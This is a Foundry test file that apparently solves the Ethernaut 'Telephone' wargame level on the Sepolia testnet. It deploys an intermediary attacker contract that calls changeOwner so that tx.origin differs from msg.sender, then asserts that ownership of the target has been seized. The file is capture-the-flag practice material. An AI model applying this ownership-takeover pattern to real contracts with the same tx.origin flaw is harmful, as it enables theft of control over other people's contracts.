// test/Telephone.t.sol
pragma solidity ^0.8.30;

import "forge-std/Test.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract TelephoneAttacker {
    ITelephone private level;

    constructor(address _levelAddress) {
        level = ITelephone(_levelAddress);
    }

    function attack(address _newOwner) public {
        level.changeOwner(_newOwner);
    }
}

contract TelephoneTest is Test {
    ITelephone private level = ITelephone(0xf2906b58Df4d4e9244fA667dFFa5dbcbaa47e3EB);
    TelephoneAttacker private attacker;
    address private player = address(this);

    function setUp() public {
        vm.createSelectFork("sepolia");
        attacker = new TelephoneAttacker(address(level));
    }

    function test_TelephoneExploit() public {
        // 调用攻击合约，攻击合约再去调用目标合约
        attacker.attack(player);

        // 断言：成功夺取所有权
        assertEq(level.owner(), player);
    }
}
